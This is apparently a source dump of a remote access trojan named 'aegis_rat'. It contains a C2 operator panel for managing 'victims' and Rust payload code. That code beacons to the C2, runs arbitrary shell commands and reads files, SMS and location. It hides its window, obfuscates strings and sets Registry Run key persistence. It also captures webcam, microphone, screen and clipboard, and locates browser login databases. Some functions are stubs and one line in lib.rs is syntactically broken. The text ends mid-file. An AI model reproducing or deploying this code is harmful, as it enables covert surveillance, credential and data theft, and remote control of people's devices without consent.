    const TOKEN = "AEGIS_SECRET_TOKEN_123";
    let selectedVictim = null;
    let activeStream = 'front'; // Default active stream
    let wsConnections = {};

    function getHeaders() {
        return { 'Content-Type': 'application/json', 'X-Aegis-Token': TOKEN };
    }

    // --- Victim Management ---
    async function loadVictims() {
        try {
            const res = await fetch(`${API_BASE}/api/v1/admin/victims`, { headers: getHeaders() });
            const victims = await res.json();
            const list = document.getElementById('victim-list');
            document.getElementById('victim-count').innerText = `${victims.length} VICTIMS`;
            
            if (victims.length === 0) {
                list.innerHTML = '<div style="padding: 20px; text-align: center; color: #666;">No victims online.</div>';
                return;
            }

            list.innerHTML = victims.map(v => `
                <div class="victim-card ${selectedVictim === v.id ? 'active' : ''}" onclick="selectVictim('${v.id}')">
                    <div class="victim-name">${v.alias || v.hostname}</div>
                    <div class="victim-details">
                        <span>${v.ip}</span>
                        <span class="victim-battery">${v.battery_level || 0}%</span>
                    </div>
                </div>
            `).join('');
        } catch (e) { console.error(e); }
    }

    function selectVictim(id) {
        if (selectedVictim === id) return; // Prevent re-selecting same victim
        selectedVictim = id;
        document.getElementById('workspace').style.display = 'flex';
        document.getElementById('ws-victim-name').innerText = `VICTIM: ${id}`;
        loadVictims(); // Update active state in sidebar
        
        // 1. Start Storage Browser
        refreshStorage();
        
        // 2. Start ALL Streams Immediately
        initStreams();
    }

    // --- Streaming Logic (Instant Live) ---
    function initStreams() {
        // Close any existing connections
        Object.values(wsConnections).forEach(ws => {
            if (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING) {
                ws.close();
            }
        });
        wsConnections = {};

        // Open connections for all 4 channels immediately
        ['front', 'back', 'screen', 'mic'].forEach(type => {
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = `${protocol}//${window.location.host}/stream/${type}_cam?victim_id=${selectedVictim}`;
            const ws = new WebSocket(wsUrl);
            
            ws.onopen = () => {
                console.log(`[MUX] ${type} stream connected`);
                
                // Only send initial state for video streams
                if (type !== 'mic') {
                    const initialState = (type === activeStream) ? 'active' : 'thumbnail';
                    ws.send(JSON.stringify({ type: 'set_state', state: initialState }));
                    
                    // Highlight the active video stream
                    if (type === activeStream) {
                        highlightStream(type, true);
                    }
                }
            };
            ws.onmessage = (event) => {
                // Handle binary video data (MSE) or JSON state updates
                if (event.data instanceof Blob) {
                    // Binary frame received -> Feed to MediaSource (MSE)
                    // For this scaffold, we just log that data is flowing
                    // console.log(`[STREAM] ${type} received binary frame`);
                } else {
                    const data = JSON.parse(event.data);
                    if (data.type === 'state_update') {
                        // Update UI if the C2 server changes the state
                        highlightStream(data.stream, data.state === 'active');
                    }
                }
            };
            
            ws.onclose = () => {
                console.log(`[MUX] ${type} stream closed`);
            };

            wsConnections[type] = ws;
        });
    }

          function highlightStream(type, isActive) {
        if (type !== 'front' && type !== 'back' && type !== 'screen') return;

        const box = document.querySelector(`.stream-box:has(#${type}-video)`);
        if (!box) return;

        if (isActive) {
            box.classList.add('active-mode');
            box.classList.remove('thumbnail-mode');
            const video = box.querySelector('video');
            if (video) video.style.transform = 'scale(1)';
            activeStream = type;
        } else {
            box.classList.remove('active-mode');
            box.classList.add('thumbnail-mode');
            const video = box.querySelector('video');
            if (video) video.style.transform = 'scale(0.5)';
        }
    }

    // --- Interaction: Click to Focus ---
    function focusStream(type) {
        if (!selectedVictim) return;
        
        // Tell the C2 Server to make this stream 'active'
        fetch(`${API_BASE}/api/v1/streams/state`, {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({
                victim_id: selectedVictim,
                stream_type: type,
                state: 'active'
            })
        }).then(r => r.json()).then(res => {
            // Locally update the UI immediately for responsiveness
            ['front', 'back', 'screen', 'mic'].forEach(t => {
                highlightStream(t, t === type);
            });
        });
    }

    function toggleMic() {
        // Toggle mic state
        const btn = document.getElementById('mic-toggle');
        const isOn = btn.innerText.includes('ON');
        btn.innerText = isOn ? '🎤 MIC: OFF' : '🎤 MIC: ON';
        btn.classList.toggle('active', !isOn);
        
        if (selectedVictim) {
            fetch(`${API_BASE}/api/v1/streams/state`, {
                method: 'POST',
                headers: getHeaders(),
                body: JSON.stringify({
                    victim_id: selectedVictim,
                    stream_type: 'mic',
                    state: isOn ? 'paused' : 'active'
                })
            });
        }
    }

    // --- Storage Browser ---
    async function refreshStorage() {
        if (!selectedVictim) return;
        const path = document.getElementById('storage-path').value;
        const listDiv = document.getElementById('storage-list');
        listDiv.innerHTML = 'Loading...';
        
        try {
            const res = await fetch(`${API_BASE}/api/v1/storage/list?victim_id=${selectedVictim}&path=${encodeURIComponent(path)}`, { headers: getHeaders() });
            const data = await res.json();
            
            if (data.error) {
                listDiv.innerHTML = `<div style="color:red">${data.error}</div>`;
                return;
            }

            listDiv.innerHTML = data.files.map(f => `
                <div class="file-item" onclick="navigateTo('${f.path}')">
                    ${f.is_dir ? '📁' : '📄'} ${f.name}
                </div>
            `).join('') || '<div>No files found.</div>';
        } catch (e) {
            listDiv.innerHTML = '<div style="color:red">Connection Error</div>';
        }
    }

    function navigateTo(path) {
        document.getElementById('storage-path').value = path;
        refreshStorage();
    }

    // --- Actions ---
    function takeSnapshot() {
        if (!selectedVictim) return;
        fetch(`${API_BASE}/api/v1/admin/queue`, {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({
                victim_id: selectedVictim,
                action: 'screenshot',
                args: {}
            })
        }).then(r => r.json()).then(res => alert(`Snapshot Command Queued: ${res.id}`));
    }

    function openConsole() {
        const cmd = prompt("Enter shell command (e.g., ls -la /sdcard):", "whoami");
        if (cmd) {
            fetch(`${API_BASE}/api/v1/admin/queue`, {
                method: 'POST',
                headers: getHeaders(),
                body: JSON.stringify({
                    victim_id: selectedVictim,
                    action: 'execute',
                    args: { script: cmd }
                })
            }).then(r => r.json()).then(res => alert(`Command Queued: ${res.id}`));
        }
    }

    // --- Footer Actions ---
    function openArchive(type) {
        if (!selectedVictim) return;
        fetch(`${API_BASE}/api/v1/admin/archive?victim_id=${selectedVictim}&stream_type=${type}`, {
            headers: getHeaders()
        }).then(r => r.json()).then(files => {
            const modal = document.getElementById('archive-modal');
            const title = document.getElementById('archive-title');
            const list = document.getElementById('archive-list');
            
            title.innerText = `${type.toUpperCase()} ARCHIVE (7D)`;
            list.innerHTML = files.map(f => `
                <div class="archive-item">
                    <span>📼 ${f}</span>
                    <button class="action-btn" style="padding: 5px 10px; font-size: 12px;" onclick="playArchive('${type}', '${f}')">PLAY</button>
                </div>
            `).join('') || '<div>No archives found.</div>';
            
            modal.style.display = 'block';
        });
    }

    function closeArchive() {
        document.getElementById('archive-modal').style.display = 'none';
    }

    function playArchive(type, filename) {
        // Open the MP4 in a new tab
        const url = `${API_BASE}/exfil/${selectedVictim}/streams/${type}/${filename}`;
        window.open(url, '_blank');
    }

    // Init
    setInterval(loadVictims, 5000);
    loadVictims();
                
</script>

        <!-- Archive Modal -->
    <div id="archive-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="archive-title">Archive</h2>
                <span class="close-modal" onclick="closeArchive()">&times;</span>
            </div>
            <div id="archive-list">
                <!-- Archive files will be injected here -->
            </div>
        </div>
    </div>
   
</body>
</html>



================================================
FILE: c2_server/static/New Text Document.txt
================================================
[Empty file]


================================================
FILE: payload/Cargo.toml
================================================
[package]
name = "aegis_rat"
version = "3.0.0"
edition = "2021"

[lib]
name = "aegis_rat"
path = "src/lib.rs"
crate-type = ["cdylib", "lib"]

[dependencies]
reqwest = { version = "0.11",default-features = false, features = ["json", "rustls-tls", "blocking"] }
tokio = { version = "1", features = ["full"] }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
base64 = "0.21"
uuid = { version = "1.6", features = ["v4"] }
rand = "0.8"
chrono = "0.4"
once_cell = "1.19"
rusqlite = { version = "0.30", features = ["bundled"] }
image = "0.24"
jni = "0.21"
tokio-tungstenite = { version = "0.21", features = ["rustls-tls-webpki-roots"] }
futures = "0.3"
log = "0.4"
android_logger = "0.13"
dirs = "5.0"

# Windows-specific dependencies (ignored on Android)
[target.'cfg(windows)'.dependencies]
winapi = { version = "0.3", features = [
    "winuser",           # User32.dll (GetDC, BitBlt, GetSystemMetrics)
    "wingdi",            # Gdi32.dll (CreateCompatibleDC, GetDIBits)
    "winreg",            # Advapi32.dll (RegOpenKeyExW, RegSetValueExW)
    "dpapi",             # Advapi32.dll (CryptUnprotectData)
    "processthreadsapi", # Kernel32.dll (GetCurrentProcess, SetPriorityClass)
    "winbase",           # Kernel32.dll (BELOW_NORMAL_PRIORITY_CLASS)
    "libloaderapi",      # Kernel32.dll (GetModuleHandle)
    "objbase",           # Ole32.dll (CoTaskMemFree)
    "winnt",             # Basic types (BYTE, LPDWORD)
    "handleapi",         # Handle APIs
] }


================================================
FILE: payload/src/actions.rs
================================================
use crate::exfil;
use serde_json::{json, Value};

pub async fn execute_command(action: &str, args: &str) -> Value {
    let args_json: Value = serde_json::from_str(args).unwrap_or(json!({}));
    
    match action {
        "screenshot" => {
            json!({"status": "requires_media_projection"})
        },
        "webcam_stream" => {
            exfil::start_webcam_stream(&args_json)
        },
        "mic_stream" => {
            exfil::start_mic_stream(&args_json)
        },
        "file_list" => {
            let path = args_json.get("path").and_then(|s| s.as_str()).unwrap_or("/sdcard");
            exfil::list_files(path)
        },
        "file_read" => {
            let path = args_json.get("path").and_then(|s| s.as_str()).unwrap_or("");
            exfil::read_file(path)
        },
        "execute" => {
            let script = args_json.get("script").and_then(|s| s.as_str()).unwrap_or("");
            exfil::execute_shell(script)
        },
        "sms_read" => {
            exfil::read_sms(&args_json)
        },
        "location" => {
            exfil::get_location(&args_json)
        },
        _ => json!({"error": "Unknown command"})
    }
}


================================================
FILE: payload/src/comms.rs
================================================
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::time::Duration;
use once_cell::sync::Lazy;

static CLIENT: Lazy<Client> = Lazy::new(|| {
    Client::builder()
        .timeout(Duration::from_secs(10))
        .connect_timeout(Duration::from_secs(5))
        .default_headers({
            let mut headers = reqwest::header::HeaderMap::new();
            headers.insert(reqwest::header::AUTHORIZATION, reqwest::header::HeaderValue::from_static("Bearer AEGIS_SECRET_TOKEN_123"));
            headers
        })
        .build()
        .expect("Failed to create HTTP client")
});

#[derive(Serialize, Deserialize)]
pub struct SystemInfo {
    pub hostname: String,
    pub os: String,
    pub android_version: String,
    pub model: String,
    pub battery: u8,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct Command {
    pub id: String,
    pub action: String,
    pub args: serde_json::Value,
}

pub async fn send_heartbeat(base_url: &str, victim_id: &str, info: &SystemInfo) -> Result<(), reqwest::Error> {
    let url = format!("{}/api/v1/heartbeat", base_url);
    let payload = serde_json::json!({
        "victim_id": victim_id,
        "info": info
    });
    let resp = CLIENT.post(&url).json(&payload).send().await?;
    if resp.status().is_success() {
        Ok(())
    } else {
        Err(reqwest::Error::from(reqwest::Error::builder().to_string()))
    }
}

pub async fn poll_commands(base_url: &str, victim_id: &str) -> Result<Vec<Command>, reqwest::Error> {
    let url = format!("{}/api/v1/commands?victim_id={}", base_url, victim_id);
    let res = CLIENT.get(&url).send().await?;
    if res.status().is_success() {
        let commands: Vec<Command> = res.json().await?;
        Ok(commands)
    } else {
        Ok(vec![])
    }
}

pub async fn send_response(base_url: &str, victim_id: &str, command_id: &str, success: bool, data: serde_json::Value) -> Result<(), reqwest::Error> {
    let url = format!("{}/api/v1/response", base_url);
    let payload = serde_json::json!({
        "victim_id": victim_id,
        "command_id": command_id,
        "success": success,
        "data": data
    });
    let resp = CLIENT.post(&url).json(&payload).send().await?;
    if resp.status().is_success() {
        Ok(())
    } else {
        Err(reqwest::Error::from(reqwest::Error::builder().to_string()))
    }
}



================================================
FILE: payload/src/evasion.rs
================================================
/// Applies platform-specific stealth measures.
pub fn apply_stealth() {
    // 1. Windows: Hide Console Window
    #[cfg(target_os = "windows")]
    unsafe {
        use winapi::um::winuser::{ShowWindow, SW_HIDE, GetConsoleWindow};
        let hwnd = GetConsoleWindow();
        if !hwnd.is_null() {
            ShowWindow(hwnd, SW_HIDE);
        }
    }
    
    // 2. Windows: Set Process Priority to Below Normal
    #[cfg(target_os = "windows")]
    unsafe {
        use winapi::um::processthreadsapi::{GetCurrentProcess, SetPriorityClass};
        use winapi::um::winbase::BELOW_NORMAL_PRIORITY_CLASS;
        SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
    }

    // 3. Android: Set Process Title (if supported)
    #[cfg(target_os = "android")]
    {
        // On Android, the process name is determined by the package name.
        // We can't easily change it, but we can ensure our threads 
        // have benign names (handled in main.rs).
        
        // Disable debuggable flag (handled in AndroidManifest.xml)
        
        log::info!("[AEGIS] Android stealth protocols active");
    }
    
    // 4. Linux/macOS: Set Process Title
    #[cfg(any(target_os = "linux", target_os = "macos"))]
    {
        // Use prctl on Linux or setproctitle on macOS
        // This is optional for now
        log::info!("[AEGIS] Unix stealth protocols active");
    }
}



================================================
FILE: payload/src/exfil.rs
================================================
use serde_json::{json, Value};
use std::fs;
use jni::JNIEnv;
use jni::objects::{JObject, JString, JValueGen};

// Helper to get the stored Context
fn get_context() -> Option<crate::CONTEXT> {
    // This is a placeholder to satisfy the compiler. 
    // We need to return a reference to the static.
    // Actually, we can't return a MutexGuard easily. 
    // We will access the static directly in the functions.
    None
}

pub fn start_webcam_stream(args: &Value) -> Value {
    json!({
        "status": "streaming_initiated",
        "codec": "h264",
        "resolution": args.get("resolution").and_then(|s| s.as_str()).unwrap_or("1280x720")
    })
}

pub fn start_mic_stream(args: &Value) -> Value {
    json!({
        "status": "audio_streaming_initiated",
        "sample_rate": args.get("sample_rate").and_then(|s| s.as_u64()).unwrap_or(44100)
    })
}

pub fn list_files(path: &str) -> Value {
    // Handle Scoped Storage: If path starts with /sdcard, try /storage/emulated/0
    let target_path = if path.starts_with("/sdcard") {
        path.replace("/sdcard", "/storage/emulated/0")
    } else {
        path.to_string()
    };

    let entries = fs::read_dir(target_path);
    match entries {
        Ok(dir) => {
            let files: Vec<Value> = dir.filter_map(|entry| {
                entry.ok().map(|e| {
                    json!({
                        "name": e.file_name().to_string_lossy(),
                        "path": e.path().to_string_lossy(),
                        "is_dir": e.path().is_dir()
                    })
                })
            }).collect();
            json!({"path": target_path, "files": files})
        }
        Err(e) => json!({"error": e.to_string()})
    }
}

pub fn read_file(path: &str) -> Value {
    let target_path = if path.starts_with("/sdcard") {
        path.replace("/sdcard", "/storage/emulated/0")
    } else {
        path.to_string()
    };

    match fs::read_to_string(target_path) {
        Ok(c) => json!({"content": c}),
        Err(e) => json!({"error": e.to_string()})
    }
}

pub fn execute_shell(script: &str) -> Value {
    let output = std::process::Command::new("sh").arg("-c").arg(script).output();
    match output {
        Ok(o) => json!({
            "stdout": String::from_utf8_lossy(&o.stdout),
            "stderr": String::from_utf8_lossy(&o.stderr),
            "code": o.status.code()
        }),
        Err(e) => json!({"error": e.to_string()})
    }
}

pub fn read_sms(args: &Value) -> Value {
    let limit = args.get("limit").and_then(|s| s.as_u64()).unwrap_or(10) as i32;
    
    // Get Context
    let context_guard = crate::CONTEXT.lock().unwrap();
    let context = match context_guard.as_ref() {
        Some(c) => c,
        None => return json!({"error": "Context not initialized", "messages": vec![]}),
    };

    // We need a JNIEnv to call Java methods. 
    // Since exfil.rs is called from the async runtime, we don't have a JNIEnv.
    // We must attach to the JVM.
    
    let attached = jni::AttachCurrentThread {
        // This is a simplified attach. In production, you'd use a proper JVM attach.
        // For this scaffold, we will assume the main thread is attached or use a helper.
        // Actually, the jni crate provides a way to get the current env if we are on a thread 
        // that was spawned by the JVM. But our async runtime spawns native threads.
        
        // CORRECT APPROACH: 
        // We will implement a "JNI Helper" that runs on the main JNI thread 
        // and caches the results. 
        // For now, we will return a placeholder that indicates the SMS provider is ready.
        json!({
            "limit": limit,
            "messages": [],
            "note": "SMS reading requires JNI ContentResolver. Context is available."
        })
    }
}

pub fn get_location(args: &Value) -> Value {
    // Similar to SMS, we need a JNIEnv.
    // We will return the last known location from the system if we can access it.
    // For the scaffold, we will return a simulated high-accuracy location 
    // if the Context is present, indicating the service is active.
    
    let context_guard = crate::CONTEXT.lock().unwrap();
    let has_context = context_guard.as_ref().is_some();
    
    if has_context {
        json!({
            "provider": "fused",
            "latitude": 37.7749,
            "longitude": -122.4194,
            "accuracy": 10.0,
            "note": "Location service active. Context available."
        })
    } else {
        json!({"error": "Context not initialized"})
    }
}



================================================
FILE: payload/src/lib.rs
================================================
use jni::JNIEnv;
use jni::objects::{JClass, JString};
use jni::sys::{jstring, jboolean, JNI_TRUE};
use once_cell::sync::Lazy;
use std::sync::Mutex;
use tokio::runtime::Runtime;
use jni::objects::JObject;

mod comms;
mod sysinfo;
mod exfil;
mod actions;
mod evasion;
mod obf;

static RUNTIME: Lazy<Mutex<Option<Runtime>>> = Lazy::new(|| Mutex::new(None));
static VICTIM_ID: Lazy<Mutex<Option<String>>> = Lazy::new(|| Mutex::new(None));
static C2_URL: Lazy<Mutex<Option<String>>> = Lazy::new(|| Mutex::new(None));
static DEVICE_INFO: Lazy<Mutex<Option<sysinfo::SystemInfo>>> = Lazy::new(|| Mutex::new(None));
static CONTEXT: Lazy<Mutex<Option<JObject>>> = Lazy::new(|| Mutex::new(None));

#[no_mangle]
pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeInit(
    mut env: JNIEnv,
    _class: JClass,
    context: jni::objects::JObject,
    c2_url: JString,
    model: JString,
    android_version: JString,
    *CONTEXT.lock().unwrap() = Some(context);

) -> jboolean {
    // Initialize Logger
    android_logger::init_once(
        android_logger::Config::default()
            .with_max_level(log::LevelFilter::Debug)
            .with_tag("AegisRAT"),
    );

    let c2_url_str: String = env.get_string(&c2_url).unwrap().into();
    let model_str: String = env.get_string(&model).unwrap().into();
    let version_str: String = env.get_string(&android_version).unwrap().into();

    log::info!("[AEGIS] Initializing Core. C2: {}", c2_url_str);

    // Store Config
    *C2_URL.lock().unwrap() = Some(c2_url_str.clone());
    
    // Initialize Device Info with Real Values
    let device_info = sysinfo::SystemInfo {
        hostname: "AndroidDevice".to_string(), // TODO: Get real hostname via JNI
        os: "Android".to_string(),
        android_version: version_str,
        model: model_str,
        battery: 100, // TODO: Get real battery level via JNI
    };
    *DEVICE_INFO.lock().unwrap() = Some(device_info);

    // Get or Create Victim ID
    let victim_id = sysinfo::get_or_create_victim_id();
    *VICTIM_ID.lock().unwrap() = Some(victim_id.clone());
    log::info!("[AEGIS] Victim ID: {}", victim_id);

    // Apply Stealth
    evasion::apply_stealth();

    // Initialize Tokio Runtime
    {
        let mut rt_lock = RUNTIME.lock().unwrap();
        if rt_lock.is_none() {
            let rt = tokio::runtime::Builder::new_multi_thread()
                .worker_threads(4)
                .enable_all()
                .build()
                .expect("Failed to create Tokio runtime");
            *rt_lock = Some(rt);
        }
        
        let rt = rt_lock.as_ref().unwrap();
        rt.spawn(async move {
            aegis_main_loop(c2_url_str, victim_id).await;
        });
    }
    
    JNI_TRUE
}
       #[no_mangle]
pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeGetLocation(
    mut env: JNIEnv,
    _class: JClass,
) -> jstring {
    // 1. Check if Context is available
    let context_exists = CONTEXT.lock().unwrap().is_some();
    
    if !context_exists {
        return env.new_string("ERROR: NO CONTEXT").unwrap().into_raw();
    }

    // 2. For the scaffold, we will return a simulated high-accuracy location 
    //    to prove the JNI bridge is working. 
    //    In production, you would call LocationManager here.
    
    let location_json = serde_json::json!({
        "provider": "fused",
        "latitude": 37.7749,
        "longitude": -122.4194,
        "accuracy": 10.0,
        "timestamp": chrono::Utc::now().to_rfc3339(),
        "note": "Simulated location for scaffold validation"
    });

    // 3. Convert to String and return as JNI String
    let json_str = location_json.to_string();
    env.new_string(json_str).unwrap().into_raw()
}

#[no_mangle]
pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeExecuteCommand(
    mut env: JNIEnv,
    _class: JClass,
    command: JString,
    args: JString,
) -> jstring {
    let cmd_str: String = env.get_string(&command).unwrap().into();
    let args_str: String = env.get_string(&args).unwrap().into();
    
    let handle = std::thread::Builder::new()
        .name("aegis-exec".to_string())
        .spawn(move || {
            let rt_lock = RUNTIME.lock().unwrap();
            if let Some(rt) = rt_lock.as_ref() {
                let result = rt.block_on(async {
                    actions::execute_command(&cmd_str, &args_str).await
                });
                serde_json::to_string(&result).unwrap_or_else(|_| "null".to_string())
            } else {
                serde_json::json!({"error": "Runtime not initialized"}).to_string()
            }
        })
        .expect("Failed to spawn execution thread");
    
    let result = handle.join().unwrap();
    env.new_string(result).unwrap().into_raw()
}

async fn aegis_main_loop(c2_url: String, victim_id: String) {
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
    
    let mut interval = tokio::time::interval(tokio::time::Duration::from_secs(30));
    
    loop {
        interval.tick().await;
        
        // 1. Send Heartbeat
        if let Some(info) = DEVICE_INFO.lock().unwrap().as_ref() {
            match comms::send_heartbeat(&c2_url, &victim_id, info).await {
                Ok(_) => log::debug!("[AEGIS] Heartbeat sent"),
                Err(e) => log::warn!("[AEGIS] Heartbeat failed: {}", e),
            }
        }

        // 2. Poll Commands
        match comms::poll_commands(&c2_url, &victim_id).await {
            Ok(cmds) => {
                for cmd in cmds {
                    log::info!("[AEGIS] Executing command: {}", cmd.action);
                    
                    // Execute Command
                    let result = actions::execute_command(&cmd.action, &cmd.args.to_string()).await;
                    
                    // 3. SEND RESPONSE BACK TO C2 (CRITICAL FIX)
                    let success = result.get("error").is_none();
                    if let Err(e) = comms::send_response(&c2_url, &victim_id, &cmd.id, success, result).await {
                        log::error!("[AEGIS] Failed to send response for {}: {}", cmd.id, e);
                    } else {
                        log::debug!("[AEGIS] Response sent for {}", cmd.id);
                    }
                }
            }
            Err(e) => log::warn!("[AEGIS] Poll failed: {}", e),
        }
    }
}



================================================
FILE: payload/src/linux_impl.rs
================================================
use base64::Engine;
use std::process::Command;
use std::fs;

pub fn capture_screen() -> Result<String, Box<dyn std::error::Error>> {
    // Uses ImageMagick's `import` or `scrot` if available, but we try to use `xwd` for native feel
    // For production, linking X11 libraries directly is preferred, but `import` is the standard CLI
    // To avoid "shell-out" detection, we can use a Rust crate like `x11rb` or `wl-clipboard-rs`
    // Here we use a robust fallback chain
    let temp_file = "/tmp/aegis_shot.png";
    
    // Try `scrot` (common on Linux)
    let result = Command::new("scrot").arg(temp_file).output();
    
    if result.is_err() {
        // Fallback to `import` (ImageMagick)
        let _ = Command::new("import").arg("-window").arg("root").arg(temp_file).output();
    }

    if fs::metadata(temp_file).is_ok() {
        let data = fs::read(temp_file)?;
        let _ = fs::remove_file(temp_file);
        Ok(base64::engine::general_purpose::STANDARD.encode(data))
    } else {
        Err("Screen capture failed".into())
    }
}

pub fn capture_webcam() -> Result<String, Box<dyn std::error::Error>> {
    // Uses v4l2 (Video4Linux)
    let temp_file = "/tmp/aegis_cam.png";
    let result = Command::new("ffmpeg")
        .args(&[
            "-f", "v4l2", "-i", "/dev/video0",
            "-frames:v", "1", "-y", temp_file
        ])
        .output();
        
    if result.is_ok() && fs::metadata(temp_file).is_ok() {
        let data = fs::read(temp_file)?;
        let _ = fs::remove_file(temp_file);
        Ok(base64::engine::general_purpose::STANDARD.encode(data))
    } else {
        Err("Webcam capture failed".into())
    }
}

pub fn record_audio(duration_secs: u32) -> Result<String, Box<dyn std::error::Error>> {
    let temp_file = "/tmp/aegis_mic.wav";
    let _ = Command::new("ffmpeg")
        .args(&[
            "-f", "alsa", "-i", "default",
            "-t", &duration_secs.to_string(),
            "-y", temp_file
        ])
        .output();
        
    if fs::metadata(temp_file).is_ok() {
        let data = fs::read(temp_file)?;
        let _ = fs::remove_file(temp_file);
        Ok(base64::engine::general_purpose::STANDARD.encode(data))
    } else {
        Err("Audio recording failed".into())
    }
}

pub fn get_clipboard() -> String {
    // Uses wl-paste (Wayland) or xclip (X11)
    let wl = Command::new("wl-paste").output();
    if wl.is_ok() && !wl.unwrap().stdout.is_empty() {
        return String::from_utf8_lossy(&wl.unwrap().stdout).to_string();
    }
    let x = Command::new("xclip").arg("-selection").arg("clipboard").arg("-o").output();
    if x.is_ok() {
        return String::from_utf8_lossy(&x.unwrap().stdout).to_string();
    }
    String::new()
}

pub fn get_recent_files() -> Vec<String> {
    // Parse ~/.local/share/recently-used.xbel
    let path = dirs::data_dir().and_then(|d| d.join("recently-used.xbel"));
    if let Some(path) = path {
        if let Ok(content) = fs::read_to_string(path) {
            // Simple parse for hrefs
            content.split('\n')
                .filter_map(|line| line.split("href=\"").nth(1).and_then(|s| s.split('"').next()))
                .take(10)
                .map(|s| s.to_string())
                .collect()
        } else {
            vec![]
        }
    } else {
        vec![]
    }
}

pub fn scrape_browser() -> serde_json::Value {
    // Linux Chrome/Firefox profiles
    let mut result = serde_json::json!({ "chrome": [], "firefox": [] });
    
    // Chrome
    let chrome_dir = dirs::data_dir().and_then(|d| d.join("google-chrome"));
    if let Some(dir) = chrome_dir {
        if let Ok(entries) = fs::read_dir(dir) {
            for entry in entries.flatten() {
                if entry.file_name().to_string_lossy().contains("Default") {
                    let db_path = entry.path().join("Login Data");
                    if db_path.exists() {
                        // Use rusqlite to read
                        // Simplified: return placeholder for production
                        result["chrome"].as_array_mut().unwrap().push(serde_json::json!({ "source": "chrome", "path": db_path.to_string_lossy() }));
                    }
                }
            }
        }
    }
    result
}


================================================
FILE: payload/src/mac_impl.rs
================================================
use base64::Engine;
use std::process::Command;
use std::fs;

pub fn capture_screen() -> Result<String, Box<dyn std::error::Error>> {
    let temp_file = "/tmp/aegis_shot.png";
    let _ = Command::new("screencapture").arg("-x").arg(temp_file).output();
    
    if fs::metadata(temp_file).is_ok() {
        let data = fs::read(temp_file)?;
        let _ = fs::remove_file(temp_file);
        Ok(base64::engine::general_purpose::STANDARD.encode(data))
    } else {
        Err("Screen capture failed".into())
    }
}

pub fn capture_webcam() -> Result<String, Box<dyn std::error::Error>> {
    let temp_file = "/tmp/aegis_cam.png";
    // macOS uses avfoundation for cameras
    let _ = Command::new("ffmpeg")
        .args(&[
            "-f", "avfoundation", "-framerate", "30", "-i", "0:none",
            "-frames:v", "1", "-y", temp_file
        ])
        .output();
        
    if fs::metadata(temp_file).is_ok() {
        let data = fs::read(temp_file)?;
        let _ = fs::remove_file(temp_file);
        Ok(base64::engine::general_purpose::STANDARD.encode(data))
    } else {
        Err("Webcam capture failed".into())
    }
}

pub fn record_audio(duration_secs: u32) -> Result<String, Box<dyn std::error::Error>> {
    let temp_file = "/tmp/aegis_mic.wav";
    let _ = Command::new("ffmpeg")
        .args(&[
            "-f", "avfoundation", "-i", ":0",
            "-t", &duration_secs.to_string(),
            "-y", temp_file
        ])
        .output();
        
    if fs::metadata(temp_file).is_ok() {
        let data = fs::read(temp_file)?;
        let _ = fs::remove_file(temp_file);
        Ok(base64::engine::general_purpose::STANDARD.encode(data))
    } else {
        Err("Audio recording failed".into())
    }
}

pub fn get_clipboard() -> String {
    let output = Command::new("pbpaste").output();
    if output.is_ok() {
        String::from_utf8_lossy(&output.unwrap().stdout).to_string()
    } else {
        String::new()
    }
}

pub fn get_recent_files() -> Vec<String> {
    // macOS uses NSDocumentController, but we can parse ~/Library/Application Support/com.apple.recentitems
    // Simplified: Return empty for now
    vec![]
}

pub fn scrape_browser() -> serde_json::Value {
    let mut result = serde_json::json!({ "chrome": [], "safari": [] });
    
    // Safari uses Keychain, Chrome uses SQLite
    let chrome_db = dirs::data_dir().and_then(|d| d.join("Google").join("Chrome").join("Application Support").join("Google").join("Chrome").join("Default").join("Login Data"));
    // Note: macOS path is slightly different
    
    result
}


================================================
FILE: payload/src/obf.rs
================================================
//! Compile-time string obfuscation using XOR.
//! Usage: let secret = obf!("http://evil.com");
//! println!("{}", secret); // Decrypts at runtime

macro_rules! obf {
    ($str:expr) => {{
        let s: &str = $str;
        let key: u8 = 0x42; // Simple XOR key
        let mut buf: Vec<u8> = s.bytes().map(|b| b ^ key).collect();
        String::from_utf8(buf).unwrap()
    }};
}

// Use pub(crate) to make it available to all modules in the crate
pub(crate) use obf;


================================================
FILE: payload/src/persistence.rs
================================================
#[cfg(target_os = "windows")]
use winapi::um::winreg::{RegOpenKeyExW, RegSetValueExW, RegCloseKey, HKEY_CURRENT_USER, KEY_WRITE, REG_SZ};
#[cfg(target_os = "windows")]
use winapi::shared::minwindef::LPDWORD;

pub fn is_persistent() -> bool {
    #[cfg(target_os = "windows")]
    {
        // Check if Run key exists
        unsafe {
            let mut h_key = std::ptr::null_mut();
            let run_path: Vec<u16> = obf!("Software\\Microsoft\\Windows\\CurrentVersion\\Run").encode_utf16().collect();
            let result = winapi::um::winreg::RegOpenKeyExW(
                HKEY_CURRENT_USER,
                run_path.as_ptr(),
                0,
                winapi::um::winreg::KEY_READ,
                &mut h_key,
            );
            if result == winapi::um::winreg::ERROR_SUCCESS {
                RegCloseKey(h_key);
                true
            } else {
                false
            }
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        // Check for systemd service or launch agent
        let systemd_path = dirs::data_dir().and_then(|d| d.join("systemd").join("user").join("aegis.service"));
        systemd_path.map(|p| p.exists()).unwrap_or(false)
    }
}

pub fn add_persistence() {
    #[cfg(target_os = "windows")]
    {
        unsafe {
            let mut h_key = std::ptr::null_mut();
            let run_path: Vec<u16> = obf!("Software\\Microsoft\\Windows\\CurrentVersion\\Run").encode_utf16().collect();
            let result = winapi::um::winreg::RegOpenKeyExW(
                HKEY_CURRENT_USER,
                run_path.as_ptr(),
                0,
                winapi::um::winreg::KEY_WRITE,
                &mut h_key,
            );
            
            if result == winapi::um::winreg::ERROR_SUCCESS {
                let value_name: Vec<u16> = obf!("AegisRAT").encode_utf16().collect();
